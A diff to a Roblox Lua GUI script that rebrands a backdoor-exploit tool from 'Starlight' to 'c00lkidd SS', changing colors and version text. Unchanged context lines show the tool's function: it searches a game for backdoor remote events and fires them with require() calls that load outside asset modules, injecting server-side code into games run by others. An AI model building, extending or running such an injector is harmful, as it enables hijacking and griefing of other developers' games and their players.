@@ -196,7 +196,7 @@ Converted["_ImageLabel"].Size = UDim2.new(0, 250, 0, 250)
 Converted["_ImageLabel"].Parent = Converted["_Frame"]
 
 Converted["_stat"].Image = "rbxassetid://7442093008"
-Converted["_stat"].ImageColor3 = Color3.fromRGB(0,0,0)
+Converted["_stat"].ImageColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_stat"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_stat"].BackgroundTransparency = 1
 Converted["_stat"].BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -854,7 +854,7 @@ Converted["_UIStroke18"].Thickness = 1.5
 Converted["_UIStroke18"].Parent = Converted["_ToggleMode"]
 
 Converted["_Version"].Font = Enum.Font.Cartoon
-Converted["_Version"].Text = "Version : Rig6"
+Converted["_Version"].Text = "Version : c00lkidd"
 Converted["_Version"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_Version"].TextScaled = true
 Converted["_Version"].TextSize = 14
@@ -2465,7 +2465,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			script.Parent.Framee.Log.Visible = true
 			script.Parent.Framee.Log.Text = "Injected: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown")
 	
-			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
+			script.Parent.stat.ImageColor3 = Color3.fromRGB(255, 0, 0)
 			game.StarterGui:SetCore("SendNotification",{
 				Title = "c00lkidd SS",
 				Text = "Backdoor Found in " .. scanTime .."s! backdoor: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown"),
@@ -2476,7 +2476,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
                         wait(0.5)
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
                         fireRemoteEvent('require(7276744247):noskids("' .. game.Players.LocalPlayer.Name ..  '")')
-                        fireRemoteEvent('require(3986243232).load("No good sir this is starlight modded",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+                        fireRemoteEvent('require(3986243232).load("No good sir this is c00lkidd SS",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 		else
 			script.Parent.Framee.Check.Text = "backdoor not found!"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
